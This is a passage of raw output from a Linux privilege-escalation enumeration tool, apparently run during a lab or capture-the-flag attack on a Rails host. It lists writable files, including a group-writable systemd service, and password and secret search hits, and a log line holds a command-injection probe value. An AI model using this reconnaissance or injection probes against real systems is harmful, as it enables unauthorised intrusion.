+-rw-r--r--. 1 root root 318 Dec  9  2018 /usr/share/doc/teamd/example_configs/activebackup_tipc.conf
+-rw-r--r--. 1 root root 97389 Nov 13  2020 /usr/share/info/dir.old
+-rw-r--r-- 1 root root 32772 Sep 15  2020 /usr/share/locale/cs/LC_MESSAGES/pg_basebackup-10.mo
+-rw-r--r-- 1 root root 33195 Sep 15  2020 /usr/share/locale/de/LC_MESSAGES/pg_basebackup-10.mo
+-rw-r--r-- 1 root root 33576 Sep 15  2020 /usr/share/locale/es/LC_MESSAGES/pg_basebackup-10.mo
+-rw-r--r-- 1 root root 35726 Sep 15  2020 /usr/share/locale/fr/LC_MESSAGES/pg_basebackup-10.mo
+-rw-r--r-- 1 root root 36206 Sep 15  2020 /usr/share/locale/he/LC_MESSAGES/pg_basebackup-10.mo
+-rw-r--r-- 1 root root 33595 Sep 15  2020 /usr/share/locale/it/LC_MESSAGES/pg_basebackup-10.mo
+-rw-r--r-- 1 root root 37834 Sep 15  2020 /usr/share/locale/ja/LC_MESSAGES/pg_basebackup-10.mo
+-rw-r--r-- 1 root root 33581 Sep 15  2020 /usr/share/locale/ko/LC_MESSAGES/pg_basebackup-10.mo
+-rw-r--r-- 1 root root 32495 Sep 15  2020 /usr/share/locale/pl/LC_MESSAGES/pg_basebackup-10.mo
+-rw-r--r-- 1 root root 42480 Sep 15  2020 /usr/share/locale/ru/LC_MESSAGES/pg_basebackup-10.mo
+-rw-r--r-- 1 root root 31997 Sep 15  2020 /usr/share/locale/sv/LC_MESSAGES/pg_basebackup-10.mo
+-rw-r--r-- 1 root root 32769 Sep 15  2020 /usr/share/locale/tr/LC_MESSAGES/pg_basebackup-10.mo
+-rw-r--r--. 1 root root 2670 Dec  8  2016 /usr/share/man/man1/db_hotbackup.1.gz
+-rw-r--r-- 1 root root 6491 Sep 15  2020 /usr/share/man/man1/pg_basebackup.1.gz
+-r--r--r--. 1 root root 2761 Apr 24  2020 /usr/share/man/man8/vgcfgbackup.8.gz
+-rw-r--r-- 1 cmeeks cmeeks 255479 Nov 13  2020 /home/cmeeks/.rvm/gems/ruby-2.6.3/gems/ffi-1.13.1/ext/ffi_c/libffi/ChangeLog.old
+-rw-r--r-- 1 cmeeks cmeeks 7138 Nov 13  2020 /home/cmeeks/.cache/yarn/v6/npm-form-data-2.3.3-dcce52c05f644f298c6a7ab936bd724ceffbf3a6-integrity/node_modules/form-data/README.md.bak
+-rw-r--r-- 1 cmeeks cmeeks 7138 Nov 13  2020 /home/cmeeks/register_hetemit/node_modules/form-data/README.md.bak
+
+[+] Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+
+[+] Web files?(output limit)
+/var/www/:
+total 4.0K
+drwxr-xr-x   4 root root   33 Nov 13  2020 .
+drwxr-xr-x. 22 root root 4.0K Nov 13  2020 ..
+drwxr-xr-x   2 root root    6 Sep 15  2020 cgi-bin
+drwxr-xr-x   2 root root    6 Sep 15  2020 html
+
+/var/www/cgi-bin:
+total 0
+drwxr-xr-x 2 root root  6 Sep 15  2020 .
+
+[+] Readable hidden interesting files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
+
+[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+-rw-r--r--. 1 root root 166 May  8  2020 /boot/.vmlinuz-4.18.0-193.el8.x86_64.hmac
+-rw-r--r--. 1 root root 173 Oct 22  2020 /boot/.vmlinuz-4.18.0-193.28.1.el8_2.x86_64.hmac
+-rw------- 1 postgres postgres 60 Jun 12 05:27 /run/postgresql/.s.PGSQL.5432.lock
+-rw-r--r-- 1 root root 0 Mar 31 00:39 /run/initramfs/.need_shutdown
+-rw-r--r--. 1 root root 129 Oct 30  2020 /etc/selinux/targeted/.policy.sha512
+-rw-r--r--. 1 root root 18 Nov  8  2019 /etc/skel/.bash_logout
+-rw-r--r--. 1 root root 141 Nov  8  2019 /etc/skel/.bash_profile
+-rw-------. 1 root root 0 Nov 13  2020 /etc/.pwd.lock
+-rw-r--r--. 1 root root 208 Nov 13  2020 /etc/.updated
+-rw-r--r--. 1 root root 0 Nov 13  2020 /var/lib/rpm/.dbenv.lock
+-rw-r--r--. 1 root root 0 Nov 13  2020 /var/lib/rpm/.rpm.lock
+-rw-r--r--. 1 root root 0 Nov 13  2020 /var/cache/dnf/.gpgkeyschecked.yum
+-rw-r--r--. 1 root root 208 Nov 13  2020 /var/.updated
+-rw-r--r--. 1 root root 166 May  8  2020 /usr/lib/modules/4.18.0-193.el8.x86_64/.vmlinuz.hmac
+-rw-r--r--. 1 root root 173 Oct 22  2020 /usr/lib/modules/4.18.0-193.28.1.el8_2.x86_64/.vmlinuz.hmac
+-rw-r--r-- 1 root root 245 Mar 23  2020 /usr/lib/node_modules/npm/.licensee.json
+-rw-r--r-- 1 root root 3274 Mar 23  2020 /usr/lib/node_modules/npm/.mailmap
+-rw-r--r-- 1 root root 0 Mar 23  2020 /usr/lib/node_modules/npm/.npmrc
+-rw-r--r-- 1 root root 262 Jul 13  2020 /usr/lib/node_modules/npm/.travis.yml
+-rw-r--r-- 1 root root 59 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/JSONStream/.travis.yml
+-rw-r--r-- 1 root root 309 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/agent-base/.travis.yml
+-rw-r--r-- 1 root root 439 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/ajv/.tonic_example.js
+-rw-r--r-- 1 root root 62 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/ajv/scripts/.eslintrc.yml
+-rw-r--r-- 1 root root 43 Feb 14  2020 /usr/lib/node_modules/npm/node_modules/archy/.travis.yml
+-rw-r--r-- 1 root root 1308 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/are-we-there-yet/node_modules/readable-stream/.travis.yml
+-rw-r--r-- 1 root root 899 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/are-we-there-yet/node_modules/string_decoder/.travis.yml
+-rw-r--r-- 1 root root 59 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/aws4/.travis.yml
+-rw-r--r-- 1 root root 48 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/builtins/.travis.yml
+-rw-r--r-- 1 root root 1160 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/color-name/.eslintrc.json
+-rw-r--r-- 1 root root 43 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/concat-map/.travis.yml
+-rw-r--r-- 1 root root 1308 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/concat-stream/node_modules/readable-stream/.travis.yml
+-rw-r--r-- 1 root root 899 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/concat-stream/node_modules/string_decoder/.travis.yml
+-rw-r--r-- 1 root root 46 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/debug/.coveralls.yml
+-rw-r--r-- 1 root root 185 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/debug/.travis.yml
+-rw-r--r-- 1 root root 276 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/define-properties/.editorconfig
+-rw-r--r-- 1 root root 4108 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/define-properties/.jscs.json
+-rw-r--r-- 1 root root 6986 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/define-properties/.travis.yml
+-rw-r--r-- 1 root root 111 Feb 14  2020 /usr/lib/node_modules/npm/node_modules/dezalgo/.travis.yml
+-rw-r--r-- 1 root root 65 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/duplexify/.travis.yml
+-rw-r--r-- 1 root root 1308 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/duplexify/node_modules/readable-stream/.travis.yml
+-rw-r--r-- 1 root root 899 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/duplexify/node_modules/string_decoder/.travis.yml
+-rw-r--r-- 1 root root 505 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/encoding/.travis.yml
+-rw-r--r-- 1 root root 179 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/err-code/.editorconfig
+-rw-r--r-- 1 root root 127 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/err-code/.eslintrc.json
+-rw-r--r-- 1 root root 54 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/err-code/.travis.yml
+-rw-r--r-- 1 root root 77 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/errno/.travis.yml
+-rw-r--r-- 1 root root 276 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/es-abstract/.editorconfig
+-rw-r--r-- 1 root root 4003 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/es-abstract/.jscs.json
+-rw-r--r-- 1 root root 234 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/es-abstract/.nycrc
+-rw-r--r-- 1 root root 6965 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/es-abstract/.travis.yml
+-rw-r--r-- 1 root root 286 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/es-to-primitive/.editorconfig
+-rw-r--r-- 1 root root 4130 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/es-to-primitive/.jscs.json
+-rw-r--r-- 1 root root 7202 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/es-to-primitive/.travis.yml
+-rw-r--r-- 1 root root 286 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/extend/.editorconfig
+-rw-r--r-- 1 root root 4096 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/extend/.jscs.json
+-rw-r--r-- 1 root root 6899 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/extend/.travis.yml
+-rw-r--r-- 1 root root 0 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/extsprintf/.gitmodules
+-rw-r--r-- 1 root root 562 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/fast-json-stable-stringify/.eslintrc.yml
+-rw-r--r-- 1 root root 108 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/fast-json-stable-stringify/.travis.yml
+-rw-r--r-- 1 root root 69 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/flush-write-stream/.travis.yml
+-rw-r--r-- 1 root root 1308 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/flush-write-stream/node_modules/readable-stream/.travis.yml
+-rw-r--r-- 1 root root 899 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/flush-write-stream/node_modules/string_decoder/.travis.yml
+-rw-r--r-- 1 root root 109 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/from2/.travis.yml
+-rw-r--r-- 1 root root 1308 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/from2/node_modules/readable-stream/.travis.yml
+-rw-r--r-- 1 root root 899 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/from2/node_modules/string_decoder/.travis.yml
+-rw-r--r-- 1 root root 421 Feb 14  2020 /usr/lib/node_modules/npm/node_modules/fs-vacuum/.eslintrc
+-rw-r--r-- 1 root root 215 Feb 14  2020 /usr/lib/node_modules/npm/node_modules/fs-vacuum/.travis.yml
+-rw-r--r-- 1 root root 141 Feb 14  2020 /usr/lib/node_modules/npm/node_modules/fs-write-stream-atomic/.travis.yml
+-rw-r--r-- 1 root root 1308 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/fs-write-stream-atomic/node_modules/readable-stream/.travis.yml
+-rw-r--r-- 1 root root 899 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/fs-write-stream-atomic/node_modules/string_decoder/.travis.yml
+
+[+] Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
+-rw-r--r-- 1 cmeeks cmeeks 1346 Jun 12 05:53 /var/tmp/dnf-cmeeks-yuobhckl/dnf.log
+-rw-rw-r-- 1 cmeeks cmeeks 228 Jun 12 05:53 /var/tmp/dnf-cmeeks-yuobhckl/dnf.librepo.log
+-rw-r--r-- 1 cmeeks cmeeks 54 Jun 12 05:53 /var/tmp/dnf-cmeeks-yuobhckl/dnf.rpm.log
+-rw-rw-r-- 1 cmeeks cmeeks 2 Jun 12 05:53 /var/tmp/dnf-cmeeks-yuobhckl/expired_repos.json
+-rw-rw-r-- 1 cmeeks cmeeks 51 Jun 12 05:53 /var/tmp/dnf-cmeeks-yuobhckl/hawkey.log
+
+[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+/dev/mqueue
+/dev/shm
+/home/cmeeks
+/tmp
+/var/spool/mail/cmeeks
+/var/spool/samba
+/var/tmp
+/var/tmp/dnf-cmeeks-yuobhckl
+/var/tmp/dnf-cmeeks-yuobhckl/dnf.librepo.log
+/var/tmp/dnf-cmeeks-yuobhckl/dnf.log
+/var/tmp/dnf-cmeeks-yuobhckl/dnf.rpm.log
+/var/tmp/dnf-cmeeks-yuobhckl/expired_repos.json
+/var/tmp/dnf-cmeeks-yuobhckl/hawkey.log
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/tmp/dnf-cmeeks-yuobhckl/locks/29b4ed8396aef993e364561a16cddfc2463d3aed
+
+[+] Interesting GROUP writable files (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+  Group cmeeks:
+/etc/systemd/system/pythonapp.service
+/var/tmp/dnf-cmeeks-yuobhckl/dnf.librepo.log
+/var/tmp/dnf-cmeeks-yuobhckl/expired_repos.json
+/var/tmp/dnf-cmeeks-yuobhckl/hawkey.log
+
+[+] Searching passwords in config PHP files
+
+[+] Checking for TTY (sudo/su) passwords in audit logs
+
+[+] Finding IPs inside logs (limit 70)
+
+[+] Finding passwords inside logs (limit 70)
+
+[+] Finding emails inside logs (limit 70)
+
+[+] Finding *password* or *credential* files in home (limit 70)
+
+[+] Finding passwords inside key folders (limit 70) - only PHP files
+
+[+] Finding passwords inside key folders (limit 70) - no PHP files
+/etc/authselect/user-nsswitch.conf:# passwd:    db files
+/etc/authselect/user-nsswitch.conf:passwd:      sss files systemd
+/etc/libuser.conf:# LU_GROUPPASSWORD = !!
+/etc/libuser.conf:# LU_SHADOWPASSWORD = !!
+/etc/libuser.conf:# LU_USERPASSWORD = !!
+/etc/nsswitch.conf.bak:# passwd:    db files
+/etc/nsswitch.conf.bak:passwd:     sss files
+/etc/nsswitch.conf:# passwd:    db files
+/etc/nsswitch.conf:passwd:      sss files systemd
+/etc/openldap/schema/samba.schema:      DESC 'Allow Machine Password changes (default: 0 => off)'
+/etc/openldap/schema/samba.schema:      DESC 'Force Users to logon for password change (default: 0 => off, 2 => on)'
+/etc/openldap/schema/samba.schema:      DESC 'Length of Password History Entries (default: 0 => off)'
+/etc/openldap/schema/samba.schema:      DESC 'Maximum password age, in seconds (default: -1 => never expire passwords)'
+/etc/openldap/schema/samba.schema:      DESC 'Minimal password length (default: 5)'
+/etc/openldap/schema/samba.schema:      DESC 'Minimum password age, in seconds (default: 0 => allow immediate password change)'
+/etc/pam.d/password-auth:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
+/etc/pam.d/system-auth:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
+/etc/pki/tls/openssl.cnf:challengePassword              = A challenge password
+/etc/pki/tls/openssl.cnf:challengePassword_max          = 20
+/etc/pki/tls/openssl.cnf:challengePassword_min          = 4
+/etc/pki/tls/openssl.cnf:# input_password = secret
+/etc/pki/tls/openssl.cnf:# output_password = secret
+/etc/samba/smb.conf.example:# password server = My_PDC_Name [My_BDC_Name] [My_Next_BDC_Name]
+/etc/samba/smb.conf.example:;   password server = <NT-Server-Name>
+/etc/samba/smb.conf.example:# password server = only use this option when the "security = server"
+/etc/samba/smb.conf.example:# Use "password server = *" to automatically locate Domain Controllers.
+/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
+/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
+/etc/security/namespace.init:        passwd=$(getent passwd "$user")
+/etc/selinux/semanage.conf:usepasswd=False
+/etc/selinux/targeted/contexts/files/file_contexts:/bin/systemd-tty-ask-password-agent  --      system_u:object_r:systemd_passwd_agent_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/dovecot\.passwd.*       system_u:object_r:dovecot_passwd_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/group\.lock     --      system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/group[-\+]?     --      system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd\.adjunct.*       --      system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd\.lock    --      system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd\.OLD     --      system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd[-\+]?    --      system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/ptmptmp --      system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/\.pwd\.lock     --      system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/rc\.d/init\.d/yppasswd  --      system_u:object_r:nis_initrc_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/samba/smbpasswd --      system_u:object_r:samba_secrets_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/security/opasswd\.old   --      system_u:object_r:shadow_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/security/opasswd        --      system_u:object_r:shadow_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/opt/vmware/(workstation|player)/bin/vmware-smbpasswd        --      system_u:object_r:vmware_host_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/sbin/unix_chkpwd    --      system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/sbin/unix_update    --      system_u:object_r:updpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/sbin/unix_verify    --      system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/chage       --      system_u:object_r:passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/gpasswd     --      system_u:object_r:groupadd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/passwd      --      system_u:object_r:passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/systemd-gnome-ask-password-agent    --      system_u:object_r:systemd_passwd_agent_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/systemd-tty-ask-password-agent      --      system_u:object_r:systemd_passwd_agent_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vigr        --      system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vipw        --      system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vmware-smbpasswd\.bin       --      system_u:object_r:vmware_host_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vmware-smbpasswd    --      system_u:object_r:vmware_host_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/libexec/httpd-ssl-pass-dialog   --      system_u:object_r:httpd_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/lib/systemd/system/yppasswdd.*  --      system_u:object_r:nis_unit_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/chpasswd   --      system_u:object_r:passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/gpasswd    --      system_u:object_r:groupadd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/grpconv    --      system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/grpunconv  --      system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/pwconv     --      system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/pwhistory_helper   --      system_u:object_r:updpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/pwunconv   --      system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/rpc\.yppasswdd\.env        --      system_u:object_r:yppasswdd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/rpc\.yppasswdd     --      system_u:object_r:yppasswdd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/unix_chkpwd        --      system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/unix_update        --      system_u:object_r:updpwd_exec_t:s0
+
+[+] Finding possible password variables inside key folders (limit 140)
+/home/cmeeks/register_hetemit/config/storage.yml:#   access_key_id: <%= Rails.application.credentials.dig(:aws, :access_key_id) %>
+/home/cmeeks/register_hetemit/config/storage.yml:#   secret_access_key: <%= Rails.application.credentials.dig(:aws, :secret_access_key) %>
+/home/cmeeks/register_hetemit/config/storage.yml:#   storage_access_key: <%= Rails.application.credentials.dig(:azure_storage, :storage_access_key) %>
+/home/cmeeks/register_hetemit/log/development.log:  Parameters: {"transaction_id"=>"1", "oauth_token"=>"';echo '"}
+/home/cmeeks/register_hetemit/node_modules/aws4/aws4.js:    accessKeyId: env.AWS_ACCESS_KEY_ID || env.AWS_ACCESS_KEY,
+/home/cmeeks/register_hetemit/node_modules/aws4/aws4.js:    secretAccessKey: env.AWS_SECRET_ACCESS_KEY || env.AWS_SECRET_KEY,
+/home/cmeeks/register_hetemit/node_modules/aws4/README.md:  accessKeyId: "<your-access-key-id>",
+/home/cmeeks/register_hetemit/node_modules/aws4/README.md:aws4.sign(opts, { accessKeyId: '', secretAccessKey: '' })
+/home/cmeeks/register_hetemit/node_modules/aws4/README.md:export AWS_ACCESS_KEY_ID="<your-access-key-id>"
+/home/cmeeks/register_hetemit/node_modules/aws4/README.md:export AWS_SECRET_ACCESS_KEY="<your-secret-access-key>"
+/home/cmeeks/register_hetemit/node_modules/aws4/README.md:  secretAccessKey: "<your-secret-access-key>",
+/home/cmeeks/register_hetemit/node_modules/buffer/bin/test.js:  process.env.TRAVIS_PULL_REQUEST === 'false'
+/home/cmeeks/register_hetemit/node_modules/call-bind/.github/rebase.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/es-abstract/.github/workflows/rebase.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/get-intrinsic/.github/rebase.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/has-symbols/.github/workflows/rebase.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/is-callable/.github/workflows/rebase.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/is-core-module/.github/workflows/rebase.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/is-core-module/.github/workflows/require-allow-edits.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/is-date-object/.github/workflows/rebase.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/is-regex/.github/workflows/rebase.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/is-symbol/.github/workflows/rebase.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/node-gyp/gyp/pylib/gyp/generator/make.py:      env_key = key.replace('.', '_')  # CC.host -> CC_host
+/home/cmeeks/register_hetemit/node_modules/node-gyp/gyp/pylib/gyp/xcode_emulation.py:  _codesigning_key_cache = {}
+/home/cmeeks/register_hetemit/node_modules/node-releases/.github/workflows/nightly-sync.yml:          github_token: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/object.assign/.github/workflows/rebase.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/object.assign/.github/workflows/require-allow-edits.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/object-inspect/.github/workflows/rebase.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/object-is/.github/workflows/rebase.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/object.values/.github/workflows/rebase.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/@rails/webpacker/CHANGELOG.md:  Webpacker::Compiler.env['FRONTEND_API_KEY'] = 'your_secret_key'
+/home/cmeeks/register_hetemit/node_modules/regexp.prototype.flags/.github/workflows/rebase.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/request/README.md:        { consumer_key: CONSUMER_KEY
+/home/cmeeks/register_hetemit/node_modules/request/README.md:      { consumer_key: CONSUMER_KEY
+/home/cmeeks/register_hetemit/node_modules/request/README.md:    , consumer_key: CONSUMER_KEY
+/home/cmeeks/register_hetemit/node_modules/request/README.md:    + '?' + qs.stringify({oauth_token: req_data.oauth_token})
+/home/cmeeks/register_hetemit/node_modules/request/request.js:      accessKeyId: opts.key,
+/home/cmeeks/register_hetemit/node_modules/request/request.js:      secretAccessKey: opts.secret,
+/home/cmeeks/register_hetemit/node_modules/resolve/.github/workflows/rebase.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/resolve/.github/workflows/require-allow-edits.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/string.prototype.trimend/.github/workflows/rebase.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/string.prototype.trimstart/.github/workflows/rebase.yml:        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl.d.ts:        before(publicKey: Uint8Array, secretKey: Uint8Array): Uint8Array;
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl.d.ts:            fromSecretKey(secretKey: Uint8Array): BoxKeyPair;
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl.d.ts:            fromSecretKey(secretKey: Uint8Array): SignKeyPair;
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl.d.ts:            fromSeed(secretKey: Uint8Array): SignKeyPair;
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl.d.ts:            (msg: Uint8Array, secretKey: Uint8Array): Uint8Array;
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl.d.ts:        (msg: Uint8Array, secretKey: Uint8Array): Uint8Array;
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl.d.ts:        readonly secretKeyLength: number;
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl.d.ts:        secretKey: Uint8Array;
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl-fast.js:    crypto_box_SECRETKEYBYTES = 32,
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl-fast.js:  crypto_box_SECRETKEYBYTES: crypto_box_SECRETKEYBYTES,
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl-fast.js:    crypto_sign_SECRETKEYBYTES = 64,
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl-fast.js:  crypto_sign_SECRETKEYBYTES: crypto_sign_SECRETKEYBYTES,
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl-fast.js:  if (secretKey.length !== crypto_box_SECRETKEYBYTES)
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl-fast.js:  if (secretKey.length !== crypto_sign_SECRETKEYBYTES)
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl-fast.js:nacl.box.keyPair.fromSecretKey = function(secretKey) {
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl-fast.js:nacl.box.secretKeyLength = crypto_box_SECRETKEYBYTES;
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl-fast.js:nacl.sign.keyPair.fromSecretKey = function(secretKey) {
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl-fast.js:nacl.sign.secretKeyLength = crypto_sign_SECRETKEYBYTES;
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl-fast.js:  return {publicKey: pk, secretKey: new Uint8Array(secretKey)};
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl-fast.js:  return {publicKey: pk, secretKey: sk};
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl.js:    crypto_box_SECRETKEYBYTES = 32,
+/home/cmeeks/register_hetemit/node_modules/tweetnacl/nacl.js:  crypto_box_SECRETKEYBYTES: crypto_box_SECRETKEYBYTES,
